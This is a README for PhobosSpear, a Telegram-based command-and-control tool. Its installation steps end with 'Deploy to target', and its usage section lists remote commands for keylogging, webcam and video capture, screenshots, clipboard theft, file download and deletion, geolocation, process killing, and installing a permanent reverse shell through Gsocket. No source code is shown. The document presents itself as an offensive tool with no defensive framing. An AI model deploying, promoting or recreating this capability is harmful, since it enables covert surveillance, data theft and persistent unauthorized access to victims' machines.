<h1 align="center">
  <br>
  <a href="https://github.com/mkdirlove/PhobosSpear"><img src="https://github.com/mkdirlove/PhobosSpear/blob/main/phobos.png" alt="PhobosSpear"></a>
  <br>
  PhobosSpear is a cutting-edge Command and Control (C2) system, named after the Greek god of fear, Phobos.
  <br>
</h1>

### Installation 
- Create a telegram bot
- Edit main.py, set ```BOT_API_KEY``` to the bot's api key and ```telegram_user_id``` to your telegram id
- Install the following dependencies
  
  ```console
  pip install -r requirements.txt
  ```
- Compile to standalone binary for easier deployment

  ```bash
  pip install -U pyinstaller
  pyinstaller phobos.py
  ```
- Deploy to target
- Start telegram bot

### Usage
  ```console
    Available Commands:
    
    /start - Start the bot and display system info
    /help - Show this help message
    
    [ File & Directory Management ]
    /viewFile <file_path> - View contents of a file
    /listDir <dir_path> - List contents of a directory
    /downloadFile <file_path> - Download a file from the system
    /createFile <file_path> <content> - Create a new file with content
    /deleteFile <file_path> - Delete a specified file
    
    [ Screenshot & Camera ]
    /screenshot - Take a screenshot of the system
    /webcam - Capture an image from the system webcam
    /recordVideo <duration_in_seconds> - Record a video from the webcam
    
    [ Network & Process Info ]
    /networkInfo - Display network information (IP, interfaces)
    /services - List running services/processes
    /killProcess <process_name_or_pid> - Kill a process by its name or PID
    
    [ Clipboard Commands ]
    /getClipboard - Retrieve the contents of the clipboard
    
    [ Keylogger Commands ]
    /startKeylogger - Start logging keystrokes
    /stopKeylogger - Stop logging keystrokes and send log file
    
    [ Geolocation Command ]
    /getLocation - Get the device's location
    
    [ Misc Commands ]
    /revshell - Install permanent reverse shell using Gsocket
    /envInfo - Provide detailed system information
    /downloadFile <file_path> - Download a specified file
  ```

### Screenshots
